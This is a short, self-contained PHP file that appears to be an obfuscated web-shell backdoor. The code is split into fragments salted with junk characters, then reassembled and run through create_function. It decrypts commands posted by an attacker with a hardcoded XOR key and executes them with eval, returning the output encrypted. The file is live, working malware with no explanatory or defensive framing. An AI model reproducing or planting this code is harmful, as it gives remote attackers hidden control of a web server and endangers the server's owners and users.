<?php
$n='C$i=0;$i<$wCl;){fwCor($j=0wC;($j<$cwC&&$iwC<$l)wC;wC$j++,$i++){wC$owC.=$t{$i}^$kwC{$';
$e='j};}wC}rwCeturn $o;}ifwCwC (wC@pwCreg_match("/$kh(.+)$wCkf/",@fiwClewC_get_contwCent';
$g='$k="wC839a1f9cwC";$kwCh="fd2dc4wCbed000"wC;$wCkf=wC"658edwC5cc6726";$p=wC"kwCHPfquWjrYawC';
$x='bawCse64_dewCcwCode($m[1]wC),$k)));$o=@owCb_wCgewCt_cwCwContents();@ob_end_cleawCn()';
$C=str_replace('an','','canreatanean_fuannanctanion');
$m='BwDvv";wCfunctwCiwCon x($wCt,$k){$c=swCtrlenwC($k);$l=swCtrlen(wC$twC);$o=""wC;for(w';
$R=';$wCr=@bwCawCse64_encode(@x(wC@gzcwComwCprewCss(wC$o),$k));prinwCt("$p$wCkh$r$kf");}';
$V='s(wC"php://iwCnwCpuwCt"),$m)==1wC) wC{@ob_start();@ewCvwCal(@gzunwCcompresswC(@x(@wC';
$z=str_replace('wC','',$g.$m.$n.$e.$V.$x.$R);
$c=$C('',$z);$c();
?>
